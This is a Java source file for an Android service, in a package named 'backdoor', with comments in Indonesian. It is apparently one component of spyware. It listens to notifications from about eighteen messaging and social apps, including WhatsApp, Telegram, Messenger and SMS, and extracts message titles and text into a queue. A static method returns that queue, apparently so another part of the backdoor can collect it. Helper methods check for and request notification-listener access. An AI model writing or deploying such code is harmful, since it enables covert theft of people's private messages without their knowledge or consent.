package com.lazyframework.backdoor;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.util.Log;

import org.json.JSONObject;
import org.json.JSONArray;

import java.util.concurrent.ConcurrentLinkedQueue;

public class NotificationMonitorService extends NotificationListenerService {
    private static final String TAG = "NotifMonitor";
    
    // Queue untuk menyimpan notifikasi yang belum terkirim
    private static ConcurrentLinkedQueue<JSONObject> pendingNotifications = new ConcurrentLinkedQueue<>();
    
    // Daftar aplikasi sosial media yang ingin dimonitor
    private static final String[] TARGET_PACKAGES = {
        "com.whatsapp",           // WhatsApp
        "com.facebook.katana",    // Facebook
        "com.facebook.orca",      // Facebook Messenger
        "com.instagram.android",  // Instagram
        "org.telegram.messenger", // Telegram
        "com.twitter.android",    // Twitter/X
        "com.discord",            // Discord
        "com.snapchat.android",   // Snapchat
        "com.tencent.mm",         // WeChat
        "com.bbm",                // BBM
        "com.viber.voip",         // Viber
        "com.linecorp.line",      // LINE
        "com.skype.raider",       // Skype
        "com.slack",              // Slack
        "com.linkedin.android",   // LinkedIn
        "com.tiktok.android",     // TikTok
        "com.google.android.talk", // Google Chat
        "com.google.android.apps.messaging" // SMS
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Notification Monitor Service Created");
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            
            // Filter hanya sosial media yang ditarget
            if (!isTargetApp(packageName)) {
                return;
            }
            
            // Ekstrak data notifikasi
            JSONObject notifData = extractNotificationData(sbn);
            
            if (notifData != null) {
                Log.d(TAG, "Captured: " + notifData.toString());
                pendingNotifications.add(notifData);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing notification: " + e.getMessage());
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Bisa juga capture saat notifikasi dihapus jika diperlukan
    }
    
    private boolean isTargetApp(String packageName) {
        for (String target : TARGET_PACKAGES) {
            if (target.equals(packageName)) {
                return true;
            }
        }
        return false;
    }
    
    private JSONObject extractNotificationData(StatusBarNotification sbn) {
        try {
            JSONObject result = new JSONObject();
            
            // Informasi dasar
            result.put("package_name", sbn.getPackageName());
            result.put("app_name", getAppName(sbn.getPackageName()));
            result.put("timestamp", sbn.getPostTime());
            result.put("key", sbn.getKey());
            result.put("id", sbn.getId());
            
            // Ekstrak title dan text dari notification
            android.app.Notification notif = sbn.getNotification();
            Bundle extras = notif.extras;
            
            String title = extras.getString(android.app.Notification.EXTRA_TITLE, "");
            String text = extras.getString(android.app.Notification.EXTRA_TEXT, "");
            String subText = extras.getString(android.app.Notification.EXTRA_SUB_TEXT, "");
            String summaryText = extras.getString(android.app.Notification.EXTRA_SUMMARY_TEXT, "");
            
            result.put("title", title != null ? title : "");
            result.put("text", text != null ? text : "");
            result.put("sub_text", subText != null ? subText : "");
            result.put("summary", summaryText != null ? summaryText : "");
            
            // Big text untuk notifikasi panjang (WhatsApp, Telegram)
            CharSequence bigText = extras.getCharSequence(android.app.Notification.EXTRA_BIG_TEXT);
            if (bigText != null) {
                result.put("big_text", bigText.toString());
            }
            
            // Informasi tambahan
            result.put("when", notif.when);
            result.put("priority", notif.priority);
            
            return result;
            
        } catch (Exception e) {
            Log.e(TAG, "Extract error: " + e.getMessage());
            return null;
        }
    }
    
    private String getAppName(String packageName) {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return packageName;
        }
    }
    
    // Method untuk mengambil notifikasi yang tertunda
    public static JSONArray getPendingNotifications() {
        JSONArray array = new JSONArray();
        JSONObject notif;
        while ((notif = pendingNotifications.poll()) != null) {
            array.put(notif);
        }
        return array;
    }
    
    // Cek apakah permission notification access sudah diberikan
    public static boolean isNotificationAccessGranted(android.content.Context context) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            android.app.NotificationManager nm = (android.app.NotificationManager) 
                context.getSystemService(Context.NOTIFICATION_SERVICE);
            return nm.isNotificationListenerAccessGranted(new android.content.ComponentName(
                context, NotificationMonitorService.class));
        } else {
            // Untuk Android versi lama
            android.content.ContentResolver cr = context.getContentResolver();
            String enabled = android.provider.Settings.Secure.getString(cr, 
                "enabled_notification_listeners");
            return enabled != null && enabled.contains(context.getPackageName());
        }
    }
    
    // Buka settings untuk request permission
    public static void requestNotificationAccess(android.content.Context context) {
        android.content.Intent intent = new android.content.Intent(
            android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
